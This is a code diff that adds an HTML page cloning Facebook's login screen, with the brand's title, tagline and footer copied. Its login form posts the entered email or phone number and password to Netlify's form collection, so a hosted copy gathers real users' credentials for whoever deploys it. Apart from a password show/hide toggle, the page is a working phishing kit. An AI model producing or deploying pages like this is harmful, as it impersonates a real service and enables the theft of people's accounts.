@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook – log in or sign up</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="shortcut icon" href="fb_icon_325x325.png" type="image/x-icon" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="content">
+        <div class="image">
+          <img src="dF5SId3UHWd.svg" alt="" />
+        </div>
+        <div class="text">
+          <h2>
+            Facebook helps you connect and share with the people in your life.
+          </h2>
+        </div>
+      </div>
+      <div class="form-content">
+        <form name="contact" method="POST" data-netlify="true" class="form-box">
+          <input type="text" name="name" placeholder="Email adress or phone number" />
+          <input type="password" name="password" placeholder="Password" id="type" />
+          <sapn id="hiden" class="show"></sapn>
+          <div class="login-btn">
+            <button type="submit">Log In</button>
+          </div>
+          <a href="#" class="link1">Forgotten password?</a>
+          <span></span>
+          <a href="#" class="btn">Create New Account</a>
+        </form>
+        <div class="bottom-text">
+          <p>
+            <a href="#">Create a Page </a>for a celebrity, brand or business.
+          </p>
+        </div>
+      </div>
+    </div>
+    <footer>
+      <ul class="lang-List">
+        <li>English (UK)</li>
+        <li>
+          <a>اردو</a>
+        </li>
+        <li>
+          <a>پښتو</a>
+        </li>
+        <li>
+          <a>العربية</a>
+        </li>
+        <li>
+          <a>हिन्दी</a>
+        </li>
+        <li>
+          <a>বাংলা</a>
+        </li>
+        <li>
+          <a>ਪੰਜਾਬੀ</a>
+        </li>
+        <li>
+          <a>فارسی</a>
+        </li>
+        <li>
+          <a>ગુજરાતી</a>
+        </li>
+        <li>
+          <a>Deutsch</a>
+        </li>
+        <li>
+          <a>Español</a>
+        </li>
+      </ul>
+      <span><hr /></span>
+      <ul class="pageFooterLink">
+        <li><a href="/reg/" title="Sign up for Facebook">Sign Up</a></li>
+        <li><a href="/login/" title="Log in to Facebook">Log In</a></li>
+        <li>
+          <a href="https://messenger.com/" title="Take a look at Messenger."
+            >Messenger</a
+          >
+        </li>
+        <li>
+          <a>Facebook Lite</a>
+        </li>
+        <li>
+          <a>Watch</a>
+        </li>
+        <li>
+          <a>Places</a>
+        </li>
+        <li><a>Games</a></li>
+        <li>
+          <a>Marketplace</a>
+        </li>
+        <li>
+          <a>Facebook Pay</a>
+        </li>
+        <li>
+          <a>Oculus</a>
+        </li>
+        <li>
+          <a>Instagram</a>
+        </li>
+        <li>
+          <a>Bulletin</a>
+        </li>
+        <li>
+          <a>Local</a>
+        </li>
+        <li>
+          <a>Fundraisers</a>
+        </li>
+        <li>
+          <a>Services</a>
+        </li>
+        <li>
+          <a>Voting Information Centre</a>
+        </li>
+        <li>
+          <a>Groups</a>
+        </li>
+        <li>
+          <a>About</a>
+        </li>
+        <li>
+          <a>Create ad</a>
+        </li>
+        <li>
+          <a>Create Page</a>
+        </li>
+        <li>
+          <a>Developers</a>
+        </li>
+        <li>
+          <a>Careers</a>
+        </li>
+        <li>
+          <a>Privacy</a>
+        </li>
+        <li>
+          <a>Cookies</a>
+        </li>
+        <li>
+          <a>AdChoices </a>
+        </li>
+        <li>
+          <a>Terms</a>
+        </li>
+        <li>
+          <a>Help</a>
+        </li>
+        <li>
+          <a>Contact uploading and non-users</a>
+        </li>
+        <li>
+          <a>Settings</a>
+        </li>
+        <li>
+          <a>Activity log</a>
+        </li>
+      </ul>
+      <p>Meta © 2022</p>
+    </footer>
+    <script>
+      let hide = document.getElementById("hiden");
+      let typetext = document.getElementById("type");
+      hide.addEventListener("click", () => {
+        if (hide.classList.contains('show')) {
+          hide.classList.remove('show')
+          hide.classList.add('hide')
+          typetext.type ="password"
+
+        } else {
+          hide.classList.add('show')
+          hide.classList.remove('hide')
+          typetext.type ="text"
+      
+        }
+        console.log(typetext.type,hide);
+      });
+    </script>
+  </body>
+</html>
